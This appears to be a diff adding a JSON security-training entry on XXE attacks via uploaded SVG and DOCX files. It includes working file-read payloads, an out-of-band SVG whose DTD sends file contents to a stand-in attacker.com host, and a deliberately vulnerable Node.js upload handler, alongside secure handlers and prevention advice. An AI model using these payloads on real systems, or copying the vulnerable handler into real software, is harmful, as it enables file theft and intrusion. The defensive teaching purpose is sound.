@@ -1,0 +1,128 @@
+{
+  "id": "file-upload-xxe",
+  "category": "vulnerabilities",
+  "title": "File Upload XXE Vulnerabilities",
+  "description": "XXE vulnerabilities in file upload functionality targeting XML-based file formats like SVG, DOCX, XLSX, and others.",
+  "severity": "high",
+  "cvssScore": 7.5,
+  "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+  "cwe": "CWE-611: Improper Restriction of XML External Entity Reference",
+  "owasp": "OWASP Top 10:2021 - A05: Security Misconfiguration",
+  "sections": [
+    {
+      "id": "overview",
+      "title": "Overview",
+      "type": "text",
+      "content": "File upload functionality presents a unique XXE attack surface when applications accept and process XML-based file formats. Many modern document and image formats contain XML data that may be parsed insecurely:\n\n**Vulnerable File Formats:**\n• SVG (Scalable Vector Graphics) - image files\n• DOCX, XLSX, PPTX (Office Open XML) - Microsoft Office documents\n• ODT, ODS, ODP (OpenDocument) - LibreOffice documents\n• PDF - may contain embedded XML metadata\n• RSS/Atom feeds\n• GPX (GPS Exchange Format)\n• KML (Keyhole Markup Language)\n• SOAP attachments\n\n**Attack Scenario:**\n1. User uploads crafted XML-based file\n2. Backend parses XML without proper security controls\n3. External entities are processed\n4. File disclosure, SSRF, or DoS occurs\n\n**Why This Is Dangerous:**\n• Developers may not realize file formats contain XML\n• File upload validation often checks only file extensions/MIME types\n• XML parsing may occur in background processing\n• Applications trust file content from authenticated users"
+    },
+    {
+      "id": "svg-xxe",
+      "title": "SVG File XXE Attack",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<?xml version=\"1.0\" standalone=\"yes\"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<svg width=\"500\" height=\"500\" xmlns=\"http://www.w3.org/2000/svg\">\n  <text x=\"20\" y=\"35\" font-size=\"20\">&xxe;</text>\n</svg>",
+        "isVulnerable": true,
+        "filename": "malicious.svg"
+      }
+    },
+    {
+      "id": "svg-oob",
+      "title": "SVG Out-of-Band XXE",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE svg [\n  <!ENTITY % remote SYSTEM \"http://attacker.com/xxe.dtd\">\n  %remote;\n]>\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"200\" height=\"200\">\n  <rect width=\"200\" height=\"200\" fill=\"red\"/>\n  <text x=\"10\" y=\"100\">Malicious SVG</text>\n</svg>\n\n<!-- xxe.dtd on attacker server -->\n<!ENTITY % file SYSTEM \"file:///etc/hostname\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/log?d=%file;'>\">\n%eval;\n%exfil;",
+        "isVulnerable": true,
+        "filename": "oob-exfil.svg"
+      }
+    },
+    {
+      "id": "docx-xxe",
+      "title": "DOCX File XXE Attack",
+      "type": "text",
+      "content": "Microsoft Office Open XML files (.docx, .xlsx, .pptx) are ZIP archives containing XML files. The main content is in word/document.xml (for DOCX):\n\n**Attack Steps:**\n1. Create/open DOCX file\n2. Unzip the archive\n3. Edit word/document.xml to include XXE payload\n4. Rezip and upload\n\n**Vulnerable XML Inside DOCX:**"
+    },
+    {
+      "id": "docx-payload",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">\n]>\n<w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\">\n  <w:body>\n    <w:p>\n      <w:r>\n        <w:t>&xxe;</w:t>\n      </w:r>\n    </w:p>\n  </w:body>\n</w:document>",
+        "isVulnerable": true,
+        "filename": "word/document.xml (inside malicious.docx)"
+      }
+    },
+    {
+      "id": "vulnerable-nodejs",
+      "title": "Vulnerable Node.js File Upload Handler",
+      "type": "code",
+      "code": {
+        "language": "javascript",
+        "code": "const express = require('express');\nconst multer = require('multer');\nconst libxmljs = require('libxmljs');\nconst fs = require('fs');\n\nconst app = express();\nconst upload = multer({ dest: 'uploads/' });\n\n// Vulnerable: Parses uploaded SVG without security controls\napp.post('/upload/svg', upload.single('file'), (req, res) => {\n    if (!req.file) {\n        return res.status(400).send('No file uploaded');\n    }\n    \n    // Read uploaded file\n    const xmlContent = fs.readFileSync(req.file.path, 'utf8');\n    \n    // VULNERABLE: Default libxmljs settings allow external entities\n    try {\n        const xmlDoc = libxmljs.parseXml(xmlContent);\n        \n        // Process SVG (e.g., resize, validate)\n        res.send('SVG processed successfully');\n    } catch (err) {\n        res.status(500).send('Processing failed');\n    }\n});",
+        "isVulnerable": true,
+        "filename": "vulnerable-upload.js"
+      }
+    },
+    {
+      "id": "secure-nodejs",
+      "title": "Secure Node.js File Upload Handler",
+      "type": "code",
+      "code": {
+        "language": "javascript",
+        "code": "const express = require('express');\nconst multer = require('multer');\nconst libxmljs = require('libxmljs');\nconst fs = require('fs');\n\nconst app = express();\nconst upload = multer({ \n    dest: 'uploads/',\n    fileFilter: (req, file, cb) => {\n        // Validate file type\n        if (file.mimetype !== 'image/svg+xml') {\n            return cb(new Error('Only SVG files allowed'));\n        }\n        cb(null, true);\n    }\n});\n\napp.post('/upload/svg', upload.single('file'), (req, res) => {\n    if (!req.file) {\n        return res.status(400).send('No file uploaded');\n    }\n    \n    const xmlContent = fs.readFileSync(req.file.path, 'utf8');\n    \n    try {\n        // SECURE: Disable external entity loading\n        const xmlDoc = libxmljs.parseXml(xmlContent, {\n            noent: false,    // Disable entity substitution\n            nonet: true,     // Disable network access\n            dtdload: false,  // Disable DTD loading\n            dtdvalid: false  // Disable DTD validation\n        });\n        \n        // Additional validation: reject DOCTYPE\n        if (xmlContent.includes('<!DOCTYPE')) {\n            fs.unlinkSync(req.file.path); // Delete malicious file\n            return res.status(400).send('DOCTYPE not allowed');\n        }\n        \n        res.send('SVG processed securely');\n    } catch (err) {\n        fs.unlinkSync(req.file.path); // Clean up\n        res.status(500).send('Processing failed');\n    }\n});",
+        "isVulnerable": false,
+        "filename": "secure-upload.js"
+      }
+    },
+    {
+      "id": "python-svg",
+      "title": "Secure Python SVG Processing",
+      "type": "code",
+      "code": {
+        "language": "python",
+        "code": "from flask import Flask, request\nfrom defusedxml.lxml import fromstring\nimport os\n\napp = Flask(__name__)\n\n@app.route('/upload/svg', methods=['POST'])\ndef upload_svg():\n    if 'file' not in request.files:\n        return 'No file uploaded', 400\n    \n    file = request.files['file']\n    \n    # Validate file extension\n    if not file.filename.endswith('.svg'):\n        return 'Only SVG files allowed', 400\n    \n    # Read file content\n    svg_content = file.read()\n    \n    try:\n        # SECURE: Use defusedxml which blocks XXE by default\n        svg_tree = fromstring(svg_content)\n        \n        # Additional validation: check for DOCTYPE\n        if b'<!DOCTYPE' in svg_content:\n            return 'Invalid SVG: DOCTYPE not allowed', 400\n        \n        # Process SVG safely\n        # ...\n        \n        return 'SVG processed successfully', 200\n        \n    except Exception as e:\n        return f'Processing failed: {str(e)}', 500\n\nif __name__ == '__main__':\n    app.run()",
+        "isVulnerable": false,
+        "filename": "secure_svg_upload.py"
+      }
+    },
+    {
+      "id": "detection-prevention",
+      "title": "Detection and Prevention Strategies",
+      "type": "text",
+      "content": "**Detection Indicators:**\n• Uploaded files containing <!DOCTYPE declarations\n• Files with <!ENTITY definitions\n• Unusual outbound connections during file processing\n• Files significantly larger than expected for format\n• DOCTYPE references to external DTDs\n\n**Prevention Measures:**\n\n1. **Disable XXE in Parsers**: Configure XML parsers to reject external entities\n\n2. **Content Validation**:\n   • Reject files containing DOCTYPE declarations\n   • Reject files with ENTITY definitions\n   • Validate file structure against expected schema\n\n3. **File Type Controls**:\n   • Validate actual file content, not just extension\n   • Use allowlist of permitted file formats\n   • Consider converting XML-based formats to non-XML alternatives\n\n4. **Sandboxing**:\n   • Process uploaded files in isolated environment\n   • Restrict network access from file processing servers\n   • Run parsers with minimal privileges\n\n5. **Alternative Processing**:\n   • For images: convert SVG to raster format (PNG/JPEG)\n   • For documents: extract text without full XML parsing\n   • Use safer libraries that don't support external entities\n\n6. **Network Controls**:\n   • Block outbound connections from upload processing servers\n   • Monitor for DNS queries during file processing\n   • Alert on HTTP requests to external domains"
+    },
+    {
+      "id": "java-docx",
+      "title": "Secure Java DOCX Processing",
+      "type": "code",
+      "code": {
+        "language": "java",
+        "code": "import org.apache.poi.xwpf.usermodel.XWPFDocument;\nimport org.apache.poi.openxml4j.opc.OPCPackage;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport java.io.FileInputStream;\n\npublic class SecureDOCXProcessor {\n    \n    public void processDocx(String filePath) throws Exception {\n        // Apache POI with secure XML parser configuration\n        \n        // Configure secure XML factory for POI\n        System.setProperty(\n            \"javax.xml.parsers.DocumentBuilderFactory\",\n            \"com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderFactoryImpl\"\n        );\n        \n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        \n        // Disable XXE\n        factory.setFeature(\n            \"http://apache.org/xml/features/disallow-doctype-decl\",\n            true\n        );\n        factory.setFeature(\n            \"http://xml.org/sax/features/external-general-entities\",\n            false\n        );\n        factory.setFeature(\n            \"http://xml.org/sax/features/external-parameter-entities\",\n            false\n        );\n        factory.setExpandEntityReferences(false);\n        \n        // Process DOCX with secured parser\n        try (FileInputStream fis = new FileInputStream(filePath)) {\n            OPCPackage pkg = OPCPackage.open(fis);\n            XWPFDocument doc = new XWPFDocument(pkg);\n            \n            // Extract and process text securely\n            String text = doc.getText();\n            System.out.println(\"Extracted text: \" + text);\n            \n            doc.close();\n            pkg.close();\n        }\n    }\n}",
+        "isVulnerable": false,
+        "filename": "SecureDOCXProcessor.java"
+      }
+    },
+    {
+      "id": "testing",
+      "title": "Testing File Upload XXE",
+      "type": "text",
+      "content": "**Test Methodology:**\n\n1. **Identify XML-Based Formats**: Determine which file formats the application accepts\n\n2. **Create Malicious Files**:\n   • SVG with inline XXE payload\n   • DOCX with XXE in document.xml\n   • XLSX with XXE in sharedStrings.xml\n   • PDF with XXE in metadata\n\n3. **Test Detection**:\n   • Upload file with simple file:// entity\n   • Upload file with HTTP callback for OOB detection\n   • Monitor for outbound connections\n\n4. **Test Exfiltration**:\n   • Attempt to read /etc/passwd (Linux)\n   • Attempt to read C:\\windows\\win.ini (Windows)\n   • Use parameter entities for blind exfiltration\n\n5. **Verify Processing**:\n   • Check if file content is displayed/processed\n   • Look for evidence of entity expansion\n   • Test different file format variations\n\n**Tools:**\n• SVG with XXE: Inkscape or text editor\n• DOCX/XLSX: 7zip to unzip, edit XML, rezip\n• XXE payloads: Burp Suite, custom scripts\n• OOB detection: Burp Collaborator, interactsh"
+    }
+  ],
+  "relatedTopics": ["blind-xxe", "classic-xxe", "svg-processors", "document-parsers"],
+  "references": [
+    {
+      "title": "OWASP File Upload Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"
+    },
+    {
+      "title": "SVG Security",
+      "url": "https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload"
+    },
+    {
+      "title": "Apache POI Security",
+      "url": "https://poi.apache.org/help/faq.html#faq-N10025"
+    }
+  ]
+}
